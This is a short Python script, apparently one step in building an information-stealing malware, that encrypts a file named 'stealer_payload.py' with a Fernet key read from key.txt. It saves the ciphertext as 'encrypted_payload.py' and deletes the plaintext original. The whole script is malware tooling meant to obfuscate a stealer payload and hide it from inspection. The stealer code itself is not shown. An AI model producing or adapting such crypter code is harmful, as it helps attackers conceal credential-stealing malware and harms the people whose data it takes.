from cryptography.fernet import Fernet
import os

# Load your existing key from key.txt
with open("key.txt", "rb") as f:
    key = f.read()
print(f"🔑 Using key from key.txt: {key.decode()}")

# Read the raw payload file
with open("stealer_payload.py", "rb") as f:
    data = f.read()

# Encrypt the payload
fernet = Fernet(key)
encrypted = fernet.encrypt(data)

# Save the encrypted payload
with open("encrypted_payload.py", "wb") as f:
    f.write(encrypted)

print("✅ Encrypted payload saved to encrypted_payload.py")

# Optional: delete the raw payload file
try:
    os.remove("stealer_payload.py")
    print("🗑️ Deleted stealer_payload.py")
except Exception as e:
    print(f"⚠️ Could not delete stealer_payload.py: {e}")
